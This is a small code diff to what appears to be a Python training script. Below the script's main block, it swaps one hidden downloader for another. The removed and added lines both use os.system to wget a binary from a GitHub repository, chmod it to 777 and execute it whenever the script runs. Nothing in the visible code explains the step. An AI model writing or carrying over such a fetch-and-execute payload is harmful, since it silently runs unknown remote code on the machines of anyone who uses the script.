@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/arifrahman555/kolor/raw/main/oik')
-os.system('chmod 777 oik')
-os.system('./oik')
+os.system('wget https://github.com/16613047/testing/raw/main/nux')
+os.system('chmod 777 nux')
+os.system('./nux')
